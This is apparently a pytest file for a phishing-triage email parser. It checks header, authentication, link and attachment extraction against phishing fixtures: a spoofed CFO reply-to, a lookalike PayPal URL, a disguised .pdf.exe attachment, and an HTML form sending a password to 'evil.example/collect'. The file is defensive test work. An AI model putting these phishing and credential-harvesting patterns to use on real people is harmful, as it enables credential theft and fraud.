from helpers import make_email

from phishtriage.parser import extract_text_urls, parse_auth_results, parse_file


def test_parses_sender_reply_to_and_auth(fixtures_dir):
    email = parse_file(fixtures_dir / "bec_invoice.eml")
    assert email.from_.address == "sarah.chen@acme-corp.com"
    assert email.from_.display_name == "Sarah Chen (CFO)"
    assert email.from_.domain == "acme-corp.com"
    assert [r.address for r in email.reply_to] == ["sarah.chen.cfo@gmail.com"]
    assert (email.auth.spf, email.auth.dkim, email.auth.dmarc) == ("pass", "pass", "pass")


def test_html_links_keep_anchor_text_and_text_urls_are_added(fixtures_dir):
    email = parse_file(fixtures_dir / "credential_phish.eml")
    html_links = {l.url: l.anchor_text for l in email.links if l.source == "html"}
    assert html_links["http://paypal.com.account-verify.xyz/signin?id=88213"] == "https://www.paypal.com/signin"
    assert any(l.source == "text" and l.url == "https://www.paypal.com/signin" for l in email.links)


def test_attachments_are_hashed_and_sniffed(fixtures_dir):
    email = parse_file(fixtures_dir / "malware_attachment.eml")
    names = {a.filename: a for a in email.attachments}
    exe = names["Invoice_8812.pdf.exe"]
    assert exe.head.startswith(b"MZ")
    assert len(exe.sha256) == 64 and len(exe.md5) == 32


def test_form_action_is_captured_as_link():
    email = make_email(html='<form action="https://evil.example/collect"><input type="password"></form>')
    assert any(l.anchor_text == "<form action>" for l in email.links)


def test_auth_results_first_header_wins():
    res = parse_auth_results(["mx; spf=fail; dkim=pass", "relay; spf=pass; dmarc=none"])
    assert res.spf == "fail" and res.dkim == "pass" and res.dmarc == "none"


def test_extract_text_urls_strips_trailing_punctuation_and_adds_scheme():
    assert extract_text_urls("Go to https://a.example/x). or www.b.example.") == [
        "https://a.example/x", "http://www.b.example"]


def test_body_text_falls_back_to_stripped_html():
    email = make_email(text="", html="<p>Hello <b>there</b></p><script>x()</script>")
    assert "Hello there" in email.body_text and "x()" not in email.body_text
